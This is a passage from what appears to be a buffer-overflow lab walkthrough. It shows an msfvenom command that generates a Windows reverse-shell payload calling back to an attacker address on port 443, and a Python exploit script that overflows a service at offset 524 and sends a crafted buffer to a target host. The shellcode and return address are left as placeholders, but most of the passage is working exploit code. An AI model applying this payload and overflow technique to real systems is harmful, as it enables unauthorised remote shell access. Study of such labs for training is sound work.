# shell.py

Now that we found the right address, and verified it. Let’s get a reverse shell. I will be using a stageless shellcode since I have more than enough space to do so.

`msfvenom -p windows/shell_reverse_tcp LHOST=192.168. LPORT=443 -f py -a x86 -b "\x00\x0a\x0d" --var-name shellcode EXITFUNC=thread`

The above command will generate a shellcode, but in python3 format, which I’m not using for now, so we will remove the “b”s in the front every line and then paste it in our exploit code.
By not specifying an encoder, msfvenom will automatically choose one on it’s own, which is good.

```
import socket
import sys
from time import sleep

pattern = 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av'

badchars = ()

shellcode = ()

# [*] Exact match at offset 524

# buffer = 'A' * 600
# buffer = pattern
# buffer = 'A' * 524 + 'B' * 4  + 'C' * 122 # 524 + 4 + 122 = 650
buffer = 'A' * 524 + 'B' * 4 + shellcode + badchars

try:
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(2)
  s.connect(('172.16.3.40',9999))
  s.recv(1024)

  print '[*] Sending buffer...'
  s.send(buffer + '\r\n')
  s.close()

except:
  print '[!] Could not connect to target, exiting.'
  sys.exit()
```


